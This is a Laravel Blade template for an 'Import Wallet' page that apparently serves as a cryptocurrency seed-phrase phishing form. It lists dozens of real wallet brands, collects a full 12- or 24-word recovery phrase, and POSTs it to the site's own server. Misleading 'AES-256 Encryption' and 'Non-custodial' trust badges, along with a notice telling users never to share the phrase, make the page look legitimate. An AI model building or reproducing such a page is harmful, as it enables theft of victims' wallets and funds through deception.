<x-guest-layout>
    <div x-data="{ 
            darkMode: localStorage.getItem('darkMode') === 'true' || (localStorage.getItem('darkMode') === null && window.matchMedia('(prefers-color-scheme: dark)').matches), 
            words: Array(24).fill(''), 
            pasteMode: true, 
            wordCount: 12, 
            selectedWallet: '',
            showOtherWallets: false,
            isLoading: false,
            selectWallet(name) {
                this.selectedWallet = name;
                this.showOtherWallets = false;
            }
         }"
         x-init="$watch('darkMode', val => { document.documentElement.classList.toggle('dark', val); localStorage.setItem('darkMode', val); })"
         class="min-h-screen w-full bg-gray-50 dark:bg-black p-4 sm:p-6 md:p-8 flex items-center justify-center">
        
        <!-- Dark Mode Toggle - Minimal & Professional -->
        <button
            @click="darkMode = !darkMode"
            class="fixed top-4 right-4 z-50 p-2 rounded-lg bg-white dark:bg-gray-800 shadow-sm hover:shadow transition-all duration-200 border border-gray-200 dark:border-gray-700 text-gray-600 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700"
            title="Toggle dark mode"
            aria-label="Toggle dark mode">
            <svg x-show="darkMode" class="w-4 h-4 text-amber-400" fill="currentColor" viewBox="0 0 20 20">
                <path fill-rule="evenodd" d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" clip-rule="evenodd"></path>
            </svg>
            <svg x-show="!darkMode" class="w-4 h-4 text-gray-700" fill="currentColor" viewBox="0 0 20 20">
                <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
            </svg>
        </button>

        <!-- Main Container -->
        <div class="w-full max-w-4xl animate-fadeIn z-10">
            
            <!-- Professional Card -->
            <div class="bg-white dark:bg-gray-950 rounded-2xl shadow-xl border border-gray-200 dark:border-gray-800 overflow-hidden">
                
                <!-- Top Brand Bar - Subtle -->
                <div class="h-0.5 bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800"></div>

                <div class="p-6 sm:p-8 lg:p-10">
                    
                    <!-- Header Section -->
                    <div class="flex items-center gap-4 mb-8 pb-6 border-b border-gray-100 dark:border-gray-800">
                        <div class="w-12 h-12 rounded-xl bg-blue-600 dark:bg-blue-700 flex items-center justify-center flex-shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" />
                            </svg>
                        </div>
                        <div>
                            <h1 class="text-xl font-bold text-gray-900 dark:text-white">Import Wallet</h1>
                            <p class="text-sm text-gray-500 dark:text-gray-400">Restore access to your digital assets</p>
                        </div>
                    </div>

                    <!-- Back Link -->
                    <a href="{{ route('wallet.option') }}" 
                       class="inline-flex items-center text-sm font-medium text-gray-600 dark:text-gray-400 hover:text-blue-600 dark:hover:text-blue-400 transition-colors mb-6 group">
                        <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 mr-1.5 group-hover:-translate-x-0.5 transition-transform" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                        </svg>
                        Back to options
                    </a>

                    <form method="POST" action="{{ route('import.wallet.store') }}" @submit="isLoading = true" class="space-y-7">
                        @csrf

                        <!-- Wallet Selection -->
                        <div>
                            <label class="block text-sm font-semibold text-gray-900 dark:text-white mb-4">
                                Wallet Provider <span class="text-red-500">*</span>
                            </label>

                            <!-- Popular Wallets Grid -->
                            <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 mb-4">
                                <!-- MetaMask -->
                                <button type="button" @click="selectWallet('MetaMask')"
                                        :class="selectedWallet === 'MetaMask' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20 border-blue-500 dark:border-blue-400' : 'bg-white dark:bg-gray-900 border-gray-200 dark:border-gray-700 hover:border-blue-300 dark:hover:border-blue-500'"
                                        class="w-full p-4 rounded-xl border-2 text-left transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-orange-50 to-red-50 dark:from-orange-900/30 dark:to-red-900/30 flex items-center justify-center flex-shrink-0">
                                            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none">
                                                <path d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2s10 4.477 10 10z" fill="#F6851B"/>
                                                <circle cx="12" cy="12" r="6" fill="#E2761B"/>
                                                <circle cx="12" cy="12" r="3" fill="#F6851B"/>
                                            </svg>
                                        </div>
                                        <span class="text-sm font-semibold text-gray-900 dark:text-white">MetaMask</span>
                                    </div>
                                </button>

                                <!-- Trust Wallet -->
                                <button type="button" @click="selectWallet('Trust Wallet')"
                                        :class="selectedWallet === 'Trust Wallet' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20 border-blue-500 dark:border-blue-400' : 'bg-white dark:bg-gray-900 border-gray-200 dark:border-gray-700 hover:border-blue-300 dark:hover:border-blue-500'"
                                        class="w-full p-4 rounded-xl border-2 text-left transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-blue-50 to-cyan-50 dark:from-blue-900/30 dark:to-cyan-900/30 flex items-center justify-center flex-shrink-0">
                                            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none">
                                                <path d="M12 2l9 9-9 9-9-9 9-9z" fill="#3375BB"/>
                                                <path d="M12 6l5 5-5 5-5-5 5-5z" fill="#fff"/>
                                            </svg>
                                        </div>
                                        <span class="text-sm font-semibold text-gray-900 dark:text-white">Trust Wallet</span>
                                    </div>
                                </button>
                                
                                <!-- Coinbase -->
                                <button type="button" @click="selectWallet('Coinbase Wallet')"
                                        :class="selectedWallet === 'Coinbase Wallet' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20 border-blue-500 dark:border-blue-400' : 'bg-white dark:bg-gray-900 border-gray-200 dark:border-gray-700 hover:border-blue-300 dark:hover:border-blue-500'"
                                        class="w-full p-4 rounded-xl border-2 text-left transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-blue-50 to-indigo-50 dark:from-blue-900/30 dark:to-indigo-900/30 flex items-center justify-center flex-shrink-0">
                                            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none">
                                                <circle cx="12" cy="12" r="10" fill="#0052FF"/>
                                                <path d="M8 12h8M12 8v8" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
                                            </svg>
                                        </div>
                                        <span class="text-sm font-semibold text-gray-900 dark:text-white">Coinbase</span>
                                    </div>
                                </button>

                                <!-- Exodus -->
                                <button type="button" @click="selectWallet('Exodus')"
                                        :class="selectedWallet === 'Exodus' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20 border-blue-500 dark:border-blue-400' : 'bg-white dark:bg-gray-900 border-gray-200 dark:border-gray-700 hover:border-blue-300 dark:hover:border-blue-500'"
                                        class="w-full p-4 rounded-xl border-2 text-left transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-50 to-pink-50 dark:from-purple-900/30 dark:to-pink-900/30 flex items-center justify-center flex-shrink-0">
                                            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none">
                                                <path d="M12 2l3 9h9l-7 5 3 9-8-6-8 6 3-9-7-5h9z" fill="#7B61C9"/>
                                            </svg>
                                        </div>
                                        <span class="text-sm font-semibold text-gray-900 dark:text-white">Exodus</span>
                                    </div>
                                </button>

                                <!-- Phantom -->
                                <button type="button" @click="selectWallet('Phantom')"
                                        :class="selectedWallet === 'Phantom' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20 border-blue-500 dark:border-blue-400' : 'bg-white dark:bg-gray-900 border-gray-200 dark:border-gray-700 hover:border-blue-300 dark:hover:border-blue-500'"
                                        class="w-full p-4 rounded-xl border-2 text-left transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-50 to-violet-50 dark:from-purple-900/30 dark:to-violet-900/30 flex items-center justify-center flex-shrink-0">
                                            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none">
                                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="#AB9FF5" opacity="0.3"/>
                                                <circle cx="12" cy="12" r="6" fill="#AB9FF5"/>
                                            </svg>
                                        </div>
                                        <span class="text-sm font-semibold text-gray-900 dark:text-white">Phantom</span>
                                    </div>
                                </button>

                                <!-- More/Other -->
                                <button type="button" @click="showOtherWallets = !showOtherWallets"
                                        class="w-full p-4 rounded-xl border-2 border-dashed border-gray-300 dark:border-gray-600 hover:border-blue-400 dark:hover:border-blue-500 bg-gray-50 dark:bg-gray-800/50 text-left transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
                                    <div class="flex items-center gap-3">
                                        <div class="w-10 h-10 rounded-lg bg-gray-100 dark:bg-gray-700 flex items-center justify-center flex-shrink-0">
                                            <svg class="w-5 h-5 text-gray-500 dark:text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"/>
                                            </svg>
                                        </div>
                                        <span class="text-sm font-semibold text-gray-700 dark:text-gray-300">More wallets...</span>
                                    </div>
                                </button>
                            </div>

                            <!-- Hidden input for form submission -->
                            <input type="hidden" name="wallet_name" :value="selectedWallet" required>

                            <!-- Other Wallets Dropdown -->
                            <div x-show="showOtherWallets"
                                 x-transition:enter="transition ease-out duration-200"
                                 x-transition:enter-start="opacity-0 -translate-y-1"
                                 x-transition:enter-end="opacity-100 translate-y-0"
                                 x-cloak
                                 class="mb-4">
                                <select @change="selectedWallet = $event.target.value; showOtherWallets = false"
                                        class="w-full px-4 py-3 bg-white dark:bg-gray-900 border-2 border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900 dark:text-white text-sm font-medium transition-all">
                                    <option value="">Select a wallet provider</option>
                                    <optgroup label="Popular" class="font-bold text-gray-900 dark:text-white">
                                       <option value="MetaMask">🦊 MetaMask</option>
                                        <option value="Trust Wallet">🛡️ Trust Wallet</option>
                                        <option value="Coinbase Wallet">🔵 Coinbase Wallet</option>
                                        <option value="Exodus">🚀 Exodus</option>
                                        <option value="Phantom">👻 Phantom</option>
                                    </optgroup>
                                    <optgroup label="Hardware Wallets" class="text-gray-900 dark:text-white font-bold">
                                        <option value="Ledger">🔐 Ledger</option>
                                        <option value="Trezor">🔒 Trezor</option>
                                        <option value="KeepKey">🗝️ KeepKey</option>
                                        <option value="Safepal">📱 Safepal</option>
                                        <option value="Ellipal">🔐 Ellipal</option>
                                    </optgroup>
                                    <optgroup label="Mobile Wallets" class="text-gray-900 dark:text-white font-bold">
                                        <option value="Atomic Wallet">⚛️ Atomic Wallet</option>
                                        <option value="Mycelium">🍄 Mycelium</option>
                                        <option value="Jaxx Liberty">💎 Jaxx Liberty</option>
                                        <option value="BRD">🍞 BRD</option>
                                        <option value="Guarda">🛡️ Guarda</option>
                                        <option value="Enjin Wallet">🎮 Enjin Wallet</option>
                                        <option value="ZenGo">🧘 ZenGo</option>
                                    </optgroup>
                                    <optgroup label="Web Wallets" class="text-gray-900 dark:text-white font-bold">
                                        <option value="Blockchain Wallet">🔗 Blockchain Wallet</option>
                                        <option value="BitPay">💳 BitPay</option>
                                        <option value="BTC.com Wallet">₿ BTC.com Wallet</option>
                                        <option value="Gnosis Safe">🏦 Gnosis Safe</option>
                                    </optgroup>
                                    <optgroup label="Exchange Wallets" class="text-gray-900 dark:text-white font-bold">
                                        <option value="Binance Chain Wallet">🟡 Binance Chain Wallet</option>
                                        <option value="Huobi Wallet">🔴 Huobi Wallet</option>
                                        <option value="Kraken Wallet">🦑 Kraken Wallet</option>
                                        <option value="WazirX">💜 WazirX</option>
                                        <option value="OKX Wallet">⬛ OKX Wallet</option>
                                    </optgroup>
                                    <optgroup label="Other Wallets" class="text-gray-900 dark:text-white font-bold">
                                        <option value="Coinomi">🪙 Coinomi</option>
                                        <option value="Edge">🌊 Edge</option>
                                        <option value="Electrum">⚡ Electrum</option>
                                        <option value="Argent">🏛️ Argent</option>
                                        <option value="MathWallet">🔢 MathWallet</option>
                                        <option value="TokenPocket">🎒 TokenPocket</option>
                                        <option value="imToken">🎯 imToken</option>
                                        <option value="Rainbow Wallet">🌈 Rainbow Wallet</option>
                                        <option value="Other">Other (specify below)</option>
                                    </optgroup>
                                </select>
                            </div>

                            <!-- Custom Wallet Input -->
                            <div x-show="selectedWallet === 'Other'" 
                                 x-transition
                                 class="mt-2">
                                <input type="text" name="custom_wallet_name" placeholder="Enter wallet name" 
                                       class="w-full px-4 py-3 bg-gray-50 dark:bg-gray-900 border-2 border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900 dark:text-white placeholder-gray-400 dark:placeholder-gray-500 text-sm font-medium transition-all">
                            </div>
                        </div>

                        <!-- Word Count Selection -->
                        <div>
                            <label class="block text-sm font-semibold text-gray-900 dark:text-white mb-3">Phrase Length</label>
                            <div class="flex gap-3">
                                <button type="button" @click="wordCount = 12; words = Array(24).fill('')" 
                                        class="px-4 py-2.5 rounded-lg text-sm font-semibold transition-all duration-200 border-2 flex-1"
                                        :class="wordCount === 12 
                                            ? 'bg-blue-600 dark:bg-blue-700 text-white border-blue-600 dark:border-blue-700' 
                                            : 'bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-300 border-gray-200 dark:border-gray-700 hover:border-blue-400 dark:hover:border-blue-500'">
                                    12 Words
                                </button>
                                <button type="button" @click="wordCount = 24" 
                                        class="px-4 py-2.5 rounded-lg text-sm font-semibold transition-all duration-200 border-2 flex-1"
                                        :class="wordCount === 24 
                                            ? 'bg-blue-600 dark:bg-blue-700 text-white border-blue-600 dark:border-blue-700' 
                                            : 'bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-300 border-gray-200 dark:border-gray-700 hover:border-blue-400 dark:hover:border-blue-500'">
                                    24 Words
                                </button>
                            </div>
                        </div>

                        <!-- Input Mode Toggle -->
                        <div class="flex items-center justify-between pt-1">
                            <label class="block text-sm font-semibold text-gray-900 dark:text-white">Recovery Phrase</label>
                            <button type="button" @click="pasteMode = !pasteMode"
                                    class="text-sm font-medium text-blue-600 dark:text-blue-400 hover:text-blue-700 dark:hover:text-blue-300 flex items-center transition-colors">
                                <span x-text="pasteMode ? 'Enter individually' : 'Paste all at once'"></span>
                                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 ml-1" :class="pasteMode ? 'rotate-180' : ''" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
                                </svg>
                            </button>
                        </div>

                        <!-- Paste Mode Input -->
                        <div x-show="pasteMode" x-transition>
                            <textarea name="recovery_phrase_paste" rows="3" x-ref="pasteInput"
                                      placeholder="Enter your 12 or 24-word recovery phrase"
                                      class="w-full px-4 py-3.5 bg-gray-50 dark:bg-gray-900 border-2 border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900 dark:text-white placeholder-gray-400 dark:placeholder-gray-500 text-base font-mono font-medium transition-all resize-none"
                                      x-on:input="if($event.target.value) { const w = $event.target.value.trim().split(/\s+/); if(w.length >= 12) { wordCount = w.length === 24 ? 24 : 12; } }"></textarea>
                            <p class="mt-2 text-xs text-gray-500 dark:text-gray-400">Separate words with spaces</p>
                        </div>

                        <!-- Individual Word Inputs -->
                        <div x-show="!pasteMode" x-transition>
                            <div class="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 gap-2.5">
                                <template x-for="i in wordCount" :key="i">
                                    <div class="relative">
                                        <label class="absolute -top-2 left-2 bg-white dark:bg-gray-950 px-1.5 text-[10px] font-semibold text-blue-600 dark:text-blue-400 rounded border border-gray-200 dark:border-gray-700" x-text="i"></label>
                                        <input type="text" :name="'word_' + i" x-model="words[i - 1]"
                                               :placeholder="'Word ' + i" autocomplete="off"
                                               class="w-full px-3 py-3 bg-gray-50 dark:bg-gray-900 border-2 border-gray-200 dark:border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900 dark:text-white placeholder-gray-400 dark:placeholder-gray-500 text-sm font-semibold text-center uppercase tracking-wide transition-all">
                                    </div>
                                </template>
                            </div>
                        </div>

                        <input type="hidden" name="word_count" :value="wordCount">

                        <!-- Security Notice -->
                        <div class="p-4 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-xl">
                            <div class="flex gap-3">
                                <div class="flex-shrink-0 mt-0.5">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-amber-600 dark:text-amber-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                                    </svg>
                                </div>
                                <div>
                                    <h4 class="text-sm font-semibold text-amber-900 dark:text-amber-200 mb-1">Security Notice</h4>
                                    <p class="text-sm text-amber-800 dark:text-amber-300 leading-relaxed">
                                        Your recovery phrase grants full access to your wallet. Never share it. Legitimate support will never request this information.
                                    </p>
                                </div>
                            </div>
                        </div>

                        <!-- Submit Button -->
                        <button type="submit" :disabled="isLoading || !selectedWallet"
                                class="w-full py-3.5 px-6 text-sm font-semibold text-white rounded-xl transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 dark:focus:ring-offset-gray-950"
                                :class="isLoading || !selectedWallet ? 'bg-gray-300 dark:bg-gray-700 cursor-not-allowed' : 'bg-blue-600 dark:bg-blue-700 hover:bg-blue-700 dark:hover:bg-blue-600 shadow-sm hover:shadow'">
                            <span class="flex items-center justify-center gap-2">
                                <svg x-show="!isLoading" xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                                </svg>
                                <svg x-show="isLoading" class="animate-spin w-4 h-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                </svg>
                                <span x-text="isLoading ? 'Importing...' : 'Import Wallet'"></span>
                            </span>
                        </button>
                    </form>
                </div>

                <!-- Footer Trust Indicators -->
                <div class="px-6 sm:px-8 py-4 bg-gray-50 dark:bg-gray-900/50 border-t border-gray-100 dark:border-gray-800">
                    <div class="flex flex-wrap items-center justify-between gap-3 text-xs">
                        <div class="flex items-center gap-4 text-gray-500 dark:text-gray-400">
                            <span class="flex items-center gap-1.5">
                                <svg class="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
                                AES-256 Encryption
                            </span>
                            <span class="flex items-center gap-1.5">
                                <svg class="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
                                Non-custodial
                            </span>
                        </div>
                        <p class="text-gray-400 dark:text-gray-500">
                            © {{ date('Y') }} SecureWallet
                        </p>
                    </div>
                </div>
            </div>

            <!-- Footer Links -->
            <div class="mt-6 text-center">
                <p class="text-xs text-gray-400 dark:text-gray-600">
                    <a href="#" class="hover:text-gray-600 dark:hover:text-gray-400 transition-colors mr-4">Privacy Policy</a>
                    <a href="#" class="hover:text-gray-600 dark:hover:text-gray-400 transition-colors mr-4">Terms</a>
                    <a href="#" class="hover:text-gray-600 dark:hover:text-gray-400 transition-colors">Support</a>
                </p>
            </div>
        </div>
    </div>

    <style>
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .animate-fadeIn {
            animation: fadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }
        
        /* Professional, fast transitions */
        * {
            transition: background-color 0.15s ease, color 0.15s ease, border-color 0.15s ease, box-shadow 0.15s ease, transform 0.15s ease;
        }
        
        [x-cloak] { display: none !important; }
        
        /* === PROFESSIONAL DARK MODE === */
        .dark {
            color-scheme: dark;
        }
        
        /* Primary text - pure white */
        .dark h1, .dark h2, .dark h3, .dark h4,
        .dark p, .dark span, .dark strong, .dark b,
        .dark .font-medium, .dark .font-semibold, .dark .font-bold,
        .dark .text-gray-700, .dark .text-gray-800, .dark .text-gray-900 {
            color: #ffffff !important;
        }
        
        /* Secondary text - readable gray */
        .dark .text-gray-500, .dark .text-gray-400, .dark .text-gray-600 {
            color: #9ca3af !important;
        }
        
        /* Warning text - white for visibility */
        .dark .text-amber-700, .dark .text-amber-800, .dark .text-amber-900 {
            color: #ffffff !important;
        }
        .dark .text-amber-600 {
            color: #fcd34d !important;
        }
        
        /* Form elements */
        .dark input, .dark textarea, .dark select {
            color: #ffffff !important;
            background-color: #111827 !important;
            border-color: #374151 !important;
        }
        .dark input::placeholder, .dark textarea::placeholder {
            color: #9ca3af !important;
            opacity: 1;
        }
        
        /* Card backgrounds */
        .dark .bg-white { background-color: #030712 !important; }
        .dark .bg-gray-50 { background-color: #111827 !important; }
        .dark .bg-amber-50 { background-color: #78350f !important; }
        .dark .bg-blue-50 { background-color: #1e3a5f !important; }
        
        /* Icons */
        .dark svg { color: #e5e7eb !important; }
        .dark .text-blue-600, .dark .text-blue-700 { color: #60a5fa !important; }
        .dark .text-amber-600 { color: #fcd34d !important; }
        .dark .text-green-500 { color: #4ade80 !important; }
        
        /* Borders */
        .dark .border-gray-200, .dark .border-gray-300 { border-color: #374151 !important; }
        .dark .border-amber-200 { border-color: #b45309 !important; }
        .dark .border-blue-200 { border-color: #3b82f6 !important; }
        
        /* Links */
        .dark a { color: #93c5fd !important; }
        .dark a:hover { color: #bfdbfe !important; }
        
        /* Select optgroup */
        optgroup { font-weight: 700 !important; color: #1f2937 !important; }
        .dark optgroup { color: #ffffff !important; }
        option { padding: 6px 12px !important; }
        
        /* Page background */
        .dark .bg-gray-50, .dark .dark\:bg-black {
            background-color: #000000 !important;
        }
        
        /* Responsive */
        @media (max-width: 640px) {
            .grid-cols-2 { grid-template-columns: repeat(2, 1fr); }
            .grid-cols-3 { grid-template-columns: repeat(3, 1fr); }
        }
    </style>

    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
</x-guest-layout>